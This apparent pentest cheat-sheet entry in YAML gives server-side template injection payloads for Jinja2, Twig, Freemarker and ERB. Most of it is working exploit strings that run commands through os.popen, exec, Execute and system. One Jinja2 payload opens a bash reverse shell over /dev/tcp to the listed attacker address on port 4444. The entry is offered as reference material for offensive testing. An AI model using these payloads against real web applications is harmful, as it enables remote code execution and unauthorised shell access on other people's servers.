---
description: |
  Server-Side Template Injection — inject template expressions
  for RCE in Jinja2, Twig, Freemarker, and other engines.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Detection — try math expressions
  {{7*7}}
  ${7*7}
  #{7*7}
  <% 7*7 %>

  # Jinja2 (Python/Flask) — RCE
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

  # Jinja2 — Reverse shell
  {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"').read()}}

  # Twig (PHP)
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

  # Freemarker (Java)
  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

  # ERB (Ruby)
  <%= system("id") %>
  <%= `id` %>
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
items:
  - No_Creds
techniques:
  - Web_Injection
network_position:
  - External
  - Internal
references:
  - https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
  - https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Template%20Injection/
---
